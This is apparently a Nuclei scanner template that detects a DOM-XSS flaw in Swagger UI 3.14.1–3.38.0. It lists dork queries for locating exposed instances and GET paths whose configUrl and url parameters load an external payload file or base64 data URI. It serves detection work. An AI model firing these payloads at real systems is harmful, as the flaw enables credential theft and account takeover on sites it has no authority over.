id: swagger-ui-xss

info:
  name: Swagger UI DOM-XSS
  author: rix4uni
  severity: medium
  description: Swagger UI DOM-XSS >=3.14.1 < 3.38.0
  reference:
    - https://medium.com/@M0X0101/how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss-e84255eb8c96
    - https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers
  metadata:
    google-query:
      - intext:"Swagger UI" intitle:"Swagger UI"
    shodan-query:
      - http.title:"Swagger UI"
    censys-query:
      - services.http.response.html_title="Swagger UI"
    fofa-query:
      - title="Swagger UI"
    hunter-query:
      - web.title="Swagger UI"
  tags: swagger

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.html?configUrl=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.json"
      - "{{BaseURL}}/swagger/index.html?configUrl=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.json"
      - "{{BaseURL}}/swagger-ui/index.html?configUrl=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.json"
      - "{{BaseURL}}/swagger-ui.html?configUrl=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.json"
      - "{{BaseURL}}/v1/docs/index.html?configUrl=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.json"
      - "{{BaseURL}}/webjars/swagger-ui/index.html?configUrl=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.json"
      - "{{BaseURL}}/swagger/ui/index?configUrl=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.json"
      - "{{BaseURL}}/swagger-ui/index.html?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ=="
      - "{{BaseURL}}/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ=="

      - "{{BaseURL}}/index.html?url=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.yaml"
      - "{{BaseURL}}/swagger/index.html?url=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.yaml"
      - "{{BaseURL}}/swagger-ui/index.html?url=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.yaml"
      - "{{BaseURL}}/doc/swagger-ui/?url=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.yaml"
      - "{{BaseURL}}/browse/api-docs/index.html?url=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.yaml"
      - "{{BaseURL}}/swagger/ui/index?url=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.yaml"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "rix4uni"
          - "Swagger UI"

      - type: status
        status:
          - 200